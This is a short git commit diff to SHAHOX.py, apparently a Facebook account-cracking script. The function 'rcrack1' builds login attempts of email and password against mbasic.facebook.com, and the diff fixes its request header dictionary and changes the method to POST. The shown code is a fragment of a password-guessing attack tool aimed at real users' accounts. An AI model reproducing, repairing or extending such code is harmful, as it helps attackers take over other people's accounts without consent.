3b133d099314c491d92a8f529be14f4dc33194d6
shaharia420 <134796377+shaharia420@users.noreply.github.com>
2024-04-23 14:41:58 +0600

    Update SHAHOX.py

--- SHAHOX.py
+++ SHAHOX.py
@@ -239,8 +239,9 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb ={'authority'}: 'mbasic.facebook.com',
-           'method':'GET',
+            header_freefb ={
+	   'authority': 'mbasic.facebook.com',
+           'method':'POST',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
